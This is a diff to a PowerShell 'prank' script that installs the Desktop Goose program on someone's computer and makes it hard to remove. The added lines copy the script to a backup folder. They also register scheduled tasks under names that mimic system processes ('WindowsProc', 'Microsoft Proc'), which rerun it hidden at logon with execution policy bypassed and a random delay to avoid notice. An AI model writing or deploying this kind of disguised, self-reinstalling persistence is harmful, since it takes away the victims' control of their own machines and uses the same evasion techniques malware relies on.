@@ -6,7 +6,7 @@
     - This script will install the Desktop Goose application and make it difficult to remove by creating a scheduled task that reinstalls it if deleted.
 .NOTES
     Author: Mousman33
-    
+
 - add another layer to add to startup foler as well? Can't have one lead to the other...
 - kinda designing this script to be run regularly to check everything is still in place and recreate if something is missing. Have not figured out how to call it though. 
     - have second script and make them call each other?
@@ -57,11 +57,20 @@ function unpack-goose {
 
 function undo-honk {
     # Remove the scheduled task
+    $taskname = "WindowsProc"
     if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
-        Unregister-ScheduledTask -TaskName $taskname -Confirm:$false -TaskPath $taskpath
+        Unregister-ScheduledTask -TaskName $taskname -Confirm:$false
         Write-Host "Scheduled task '$taskname' removed." -ForegroundColor Green
     } else {
         Write-Host "Scheduled task '$taskname' not found. Skipping task removal." -ForegroundColor Yellow
+    }
+    #remove the script scheduled task
+    $scriptTaskName = "Microsoft Proc"
+    if (get-scheduledtask -TaskName $scriptTaskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $scriptTaskName -Confirm:$false
+        Write-Host "Scheduled task '$scriptTaskName' removed." -ForegroundColor Green
+    } else {
+        Write-Host "Scheduled task '$scriptTaskName' not found. Skipping task removal." -ForegroundColor Yellow
     }
     # Remove the installed files
     if (Test-Path $installPath) {
@@ -110,6 +119,10 @@ if ($install) {
         Write-Host "Desktop Goose zip file not found. Please download it from the official website and place it in your Downloads folder." -ForegroundColor Red
         pause ; exit
     }
+
+    #copy this script to the backup location so it can be called by the scheduled task even if the original is deleted
+    $scriptPath = $MyInvocation.MyCommand.Path
+    Copy-Item -Path $scriptPath -Destination "$backupPath\gooseprank.ps1" -Force
 }
 
 # get the path to the executable
@@ -136,6 +149,20 @@ if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
     Write-Host "Creating scheduled task '$taskname' to run Desktop Goose at logon..." -ForegroundColor Green
     # Create the task
     $action = New-ScheduledTaskAction -Execute $honk.FullName
+    $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes 60) # Add a random delay to make it less predictable
+    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
+    Register-ScheduledTask -TaskName $taskname -InputObject $task -Force -TaskPath $taskpath
+    Write-Host "Scheduled task '$taskname' created to run at logon." -ForegroundColor Green
+}
+
+# Create a scheduled task to run this script at logon
+$taskname = "Microsoft Proc"
+if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
+    Write-Host "Scheduled task '$taskname' already exists. Skipping task creation." -ForegroundColor Yellow
+} else {
+    Write-Host "Creating scheduled task '$taskname' to run the gooseprank script at logon..." -ForegroundColor Green
+    # Create the task
+    $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-File `"$backuppath\gooseprank.ps1`" -WindowStyle Hidden -NoProfile -executionpolicy bypass"
     $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes 60) # Add a random delay to make it less predictable
     $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
     Register-ScheduledTask -TaskName $taskname -InputObject $task -Force -TaskPath $taskpath
